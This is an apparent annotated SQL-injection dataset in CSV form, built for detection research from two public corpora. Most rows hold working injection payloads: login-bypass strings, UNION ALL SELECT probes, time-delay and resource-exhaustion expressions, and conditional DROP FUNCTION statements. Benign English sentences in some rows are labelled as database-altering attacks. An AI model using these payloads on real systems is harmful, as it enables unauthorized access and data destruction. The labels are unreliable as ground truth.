row_id,source_dataset,source_file,raw_label,raw_sql,sql_normalized,input_type,main_verb,target_tables,target_columns,initial_category,initial_impact,initial_intent,canonical_intent,attack_effect_initial,prompt_style,review_flag_unknown_verb,review_flag_empty_canonical_intent,review_flag_no_target_tables,review_flag_suspect_row,keep,dialect_guess,manual_category,manual_impact,manual_intent,target_table_canonical,prompt_domain_entity,expected_sql_operation,expected_security_violation,requires_sensitive_table,notes,semantic_category,semantic_impact,semantic_intent,semantic_canonical_intent,attack_technique,expected_security_violation.1,uses_union,uses_subquery,uses_stacked_query,uses_comment_termination,uses_time_function,uses_schema_enumeration,problematic_annotation,expected_missing_verb_for_fragment,expected_missing_table_for_fragment,review_flag_problematic_row,target_table_primary,target_num_prompts
34052,sqliv2,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\sqliv2.csv,0,"The unavailable punctuations sentence boundaries transcribed speech texts create barriers many subsequent processing tasks, summarization, information extraction, question answering machine translation","THE UNAVAILABLE PUNCTUATIONS SENTENCE BOUNDARIES TRANSCRIBED SPEECH TEXTS CREATE BARRIERS MANY SUBSEQUENT PROCESSING TASKS, SUMMARIZATION, INFORMATION EXTRACTION, QUESTION ANSWERING MACHINE TRANSLATION",injection_fragment,CREATE,,,B,legitimate,perform legitimate write operation,perform legitimate write operation,B,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,ddl_fragment,availability/integrity,False,False,False,False,False,False,False,False,True,False,,3
10102,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  8812  =  7896  )   select 8812 else drop function xltk--,IF ( 8812 = 7896 ) SELECT 8812 ELSE DROP FUNCTION XLTK--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
9262,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  8727  =  4039  )   select 8727 else drop function giql--,IF ( 8727 = 4039 ) SELECT 8727 ELSE DROP FUNCTION GIQL--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
6220,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  6554  =  1534  )   select 6554 else drop function buqb--,IF ( 6554 = 1534 ) SELECT 6554 ELSE DROP FUNCTION BUQB--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
32022,sqliv2,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\sqliv2.csv,0,The objective create clear view viewpoint,THE OBJECTIVE CREATE CLEAR VIEW VIEWPOINT,injection_fragment,CREATE,,,B,legitimate,perform legitimate write operation,perform legitimate write operation,B,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,ddl_fragment,availability/integrity,False,False,False,False,False,False,False,False,True,False,,3
3502,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  6745  =  4078  )   select 6745 else drop function ytyt--,IF ( 6745 = 4078 ) SELECT 6745 ELSE DROP FUNCTION YTYT--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
5940,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  6647  =  2179  )   select 6647 else drop function zvlq--,IF ( 6647 = 2179 ) SELECT 6647 ELSE DROP FUNCTION ZVLQ--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
5377,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  3593  =  3779  )   select 3593 else drop function qtqy--,IF ( 3593 = 3779 ) SELECT 3593 ELSE DROP FUNCTION QTQY--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
34718,sqliv2,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\sqliv2.csv,0,"In New York City , transportation officials seeking develop taxing device would also equipped pay parking meter fees , provide &quot; pay-as-you-drive &quot; insurance , create pool real-time speed data drivers motorists could use avoid traffic","IN NEW YORK CITY , TRANSPORTATION OFFICIALS SEEKING DEVELOP TAXING DEVICE WOULD ALSO EQUIPPED PAY PARKING METER FEES , PROVIDE &QUOT; PAY-AS-YOU-DRIVE &QUOT; INSURANCE , CREATE POOL REAL-TIME SPEED DATA DRIVERS MOTORISTS COULD USE AVOID TRAFFIC",injection_fragment,UNKNOWN,,,B,legitimate,unknown legitimate action,unknown legitimate action,B,,True,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,stacked_write_or_ddl_fragment,availability/integrity,False,False,True,False,False,False,False,True,True,False,,3
5416,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  9690  =  6491  )   select 9690 else drop function nyln--,IF ( 9690 = 6491 ) SELECT 9690 ELSE DROP FUNCTION NYLN--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
2690,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  9953  =  4347  )   select 9953 else drop function ocau--,IF ( 9953 = 4347 ) SELECT 9953 ELSE DROP FUNCTION OCAU--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
30209,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,0,FROM  ( SELECT DISTINCT sit FROM create ),FROM ( SELECT DISTINCT SIT FROM CREATE ),injection_fragment,UNKNOWN,"create, ( select distinct sit from create )",sit,B,legitimate,unknown legitimate action,unknown legitimate action,B,,True,False,False,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,subquery_fragment,availability/integrity,False,True,False,False,False,False,False,True,False,False,create,3
4673,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  8574  =  7534  )   select 8574 else drop function nxbe--,IF ( 8574 = 7534 ) SELECT 8574 ELSE DROP FUNCTION NXBE--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
7653,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  4947  =  5350  )   select 4947 else drop function ereg--,IF ( 4947 = 5350 ) SELECT 4947 ELSE DROP FUNCTION EREG--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
34054,sqliv2,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\sqliv2.csv,0,There always domestic opposition plan create federal Europe,THERE ALWAYS DOMESTIC OPPOSITION PLAN CREATE FEDERAL EUROPE,injection_fragment,CREATE,,,B,legitimate,perform legitimate write operation,perform legitimate write operation,B,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,ddl_fragment,availability/integrity,False,False,False,False,False,False,False,False,True,False,,3
10088,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,if  (  4907  =  9581  )   select 4907 else drop function apqw--,IF ( 4907 = 9581 ) SELECT 4907 ELSE DROP FUNCTION APQW--,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T3,availability/integrity,destroy or alter database structure,destroy or alter database structure,comment_terminated_fragment,availability/integrity,False,False,False,True,False,False,False,False,True,False,,3
7727,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1%""   )    )     )   union all select null,null,null,null--","1%"" ) ) ) UNION ALL SELECT NULL,NULL,NULL,NULL--",injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,False,True,False,,3
1538,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,-1036'  )   or 6872  =  6872 and   (  'wvbi'  =  'wvbi,-1036' ) OR 6872 = 6872 AND ( 'WVBI' = 'WVBI,injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,boolean_like_fragment,policy,False,False,False,False,False,False,False,True,True,False,,3
10220,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1' in boolean mode  )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  #","1' IN BOOLEAN MODE ) OR CHAR ( 117 ) ||CHAR ( 111 ) ||CHAR ( 105 ) ||CHAR ( 100 ) = REGEXP_SUBSTRING ( REPEAT ( LEFT ( CRYPT_KEY ( CHAR ( 65 ) ||CHAR ( 69 ) ||CHAR ( 83 ) ,NULL ) ,0 ) ,500000000 ) ,NULL ) #",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,quote_termination_fragment,policy,False,False,False,True,False,False,False,True,True,False,,3
11,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,? or 1  =  1 --,? OR 1 = 1 --,injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,boolean_based_fragment,policy,False,False,False,True,False,False,False,True,True,False,,3
34234,sqliv2,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\sqliv2.csv,0,"On 21 June , conjunction Schwarzwaldverein &#91; Black Forest Association &#93; Mid-Summer Festival , 12 July Arena , accompanied fireworks , 13 December first concert put Stadtmusik (Town Musical Society) new Festival Hall","ON 21 JUNE , CONJUNCTION SCHWARZWALDVEREIN &#91; BLACK FOREST ASSOCIATION &#93; MID-SUMMER FESTIVAL , 12 JULY ARENA , ACCOMPANIED FIREWORKS , 13 DECEMBER FIRST CONCERT PUT STADTMUSIK (TOWN MUSICAL SOCIETY) NEW FESTIVAL HALL",injection_fragment,UNKNOWN,,,B,legitimate,unknown legitimate action,unknown legitimate action,B,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,stacked_fragment,policy,False,False,True,True,False,False,False,True,True,False,,3
19290,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,admin' or ',ADMIN' OR ',injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,authentication_bypass_fragment,policy,False,False,False,False,False,False,False,True,True,False,,3
4240,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"-1573""  )   union all select 3928,3928,3928,3928--","-1573"" ) UNION ALL SELECT 3928,3928,3928,3928--",injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,False,True,False,,3
1917,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"-5661'   )    )    union all select 3011,3011#","-5661' ) ) UNION ALL SELECT 3011,3011#",injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,False,True,False,,3
7209,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1' and elt  (  3247  =  3969,3969  )   and 'xcbm' like 'xcbm","1' AND ELT ( 3247 = 3969,3969 ) AND 'XCBM' LIKE 'XCBM",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,boolean_like_fragment,policy,False,False,False,False,False,False,False,True,True,False,,3
615,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,x' or 1  =  1 or 'x'  =  'y,X' OR 1 = 1 OR 'X' = 'Y,injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,boolean_based_fragment,policy,False,False,False,False,False,False,False,True,True,False,,3
5488,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"-7296%'   )    )     )   union all select 9322,9322,9322,9322--","-7296%' ) ) ) UNION ALL SELECT 9322,9322,9322,9322--",injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,False,True,False,,3
719,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"admin""  )   or ""1""  =  ""1""--","ADMIN"" ) OR ""1"" = ""1""--",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,quote_termination_fragment,policy,False,False,False,True,False,False,False,True,True,False,,3
10253,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1' and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )","1' AND 6537 = DBMS_PIPE.RECEIVE_MESSAGE ( CHR ( 76 ) ||CHR ( 116 ) ||CHR ( 117 ) ||CHR ( 65 ) ,5 )",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,boolean_like_fragment,policy,False,False,False,False,False,False,False,True,True,False,,3
7562,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1' where 4150  =  4150 and elt  (  8012  =  6026,6026  )  --","1' WHERE 4150 = 4150 AND ELT ( 8012 = 6026,6026 ) --",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,True,True,False,,3
5765,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1""   )    )     )   union all select null,null,null,null--","1"" ) ) ) UNION ALL SELECT NULL,NULL,NULL,NULL--",injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,False,True,False,,3
4437,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,-7548 or 2850  =  9666,-7548 OR 2850 = 9666,injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,boolean_like_fragment,policy,False,False,False,False,False,False,False,True,True,False,,3
4938,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1   )    )    union all select null,null,null,null,null,null,null#","1 ) ) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#",injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,False,True,False,,3
2555,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   3127  =  3127","CALL REGEXP_SUBSTRING ( REPEAT ( LEFT ( CRYPT_KEY ( CHAR ( 65 ) ||CHAR ( 69 ) ||CHAR ( 83 ) ,NULL ) ,0 ) ,500000000 ) ,NULL ) AND ( ( 3127 = 3127",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,boolean_like_fragment,policy,False,False,False,False,False,False,False,True,True,False,,3
2935,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,-7971' union all select 4273#,-7971' UNION ALL SELECT 4273#,injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,False,True,False,,3
3949,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"-3862'   )    )    union all select 2495,2495,2495,2495,2495,2495,2495--","-3862' ) ) UNION ALL SELECT 2495,2495,2495,2495,2495,2495,2495--",injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,False,True,False,,3
3691,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1   )    )    and elt  (  9288  =  6067,6067  )   and    (    (   1895  =  1895","1 ) ) AND ELT ( 9288 = 6067,6067 ) AND ( ( 1895 = 1895",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,boolean_like_fragment,policy,False,False,False,False,False,False,False,True,True,False,,3
5325,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and   (  5621  =  5621","1 ) OR CHAR ( 68 ) ||CHAR ( 69 ) ||CHAR ( 97 ) ||CHAR ( 85 ) = REGEXP_SUBSTRING ( REPEAT ( RIGHT ( CHAR ( 5389 ) ,0 ) ,5000000000 ) ,NULL ) AND ( 5621 = 5621",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,boolean_like_fragment,policy,False,False,False,False,False,False,False,True,True,False,,3
941,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,-7999  )   or 8422  =  1336,-7999 ) OR 8422 = 1336,injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,boolean_like_fragment,policy,False,False,False,False,False,False,False,True,True,False,,3
4078,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1' and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --","1' AND CHAR ( 109 ) ||CHAR ( 79 ) ||CHAR ( 70 ) ||CHAR ( 90 ) = REGEXP_SUBSTRING ( REPEAT ( RIGHT ( CHAR ( 5012 ) ,0 ) ,5000000000 ) ,NULL ) --",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,quote_termination_fragment,policy,False,False,False,True,False,False,False,True,True,False,,3
940,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1  )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  8929  =  8929","1 ) AND CHAR ( 111 ) ||CHAR ( 77 ) ||CHAR ( 121 ) ||CHAR ( 88 ) = REGEXP_SUBSTRING ( REPEAT ( LEFT ( CRYPT_KEY ( CHAR ( 65 ) ||CHAR ( 69 ) ||CHAR ( 83 ) ,NULL ) ,0 ) ,500000000 ) ,NULL ) AND ( 8929 = 8929",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,boolean_like_fragment,policy,False,False,False,False,False,False,False,True,True,False,,3
4502,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1  )   as pcnd where 4589  =  4589 union all select null,null,null,null,null,null,null,null,null,null--","1 ) AS PCND WHERE 4589 = 4589 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,False,True,False,,3
3431,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1'  )   where 1363  =  1363 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --","1' ) WHERE 1363 = 1363 OR CHAR ( 68 ) ||CHAR ( 69 ) ||CHAR ( 97 ) ||CHAR ( 85 ) = REGEXP_SUBSTRING ( REPEAT ( RIGHT ( CHAR ( 5389 ) ,0 ) ,5000000000 ) ,NULL ) --",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,True,True,False,,3
2912,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,1   )    )    and 2006  =  2006,1 ) ) AND 2006 = 2006,injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,boolean_like_fragment,policy,False,False,False,False,False,False,False,True,True,False,,3
3884,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1  )   where 2678  =  2678 union all select null,null,null,null,null,null,null,null,null#","1 ) WHERE 2678 = 2678 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#",injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,False,True,False,,3
3773,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1'  )   as ybuv where 9641  =  9641 union all select null,null,null,null,null,null,null,null--","1' ) AS YBUV WHERE 9641 = 9641 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,False,True,False,,3
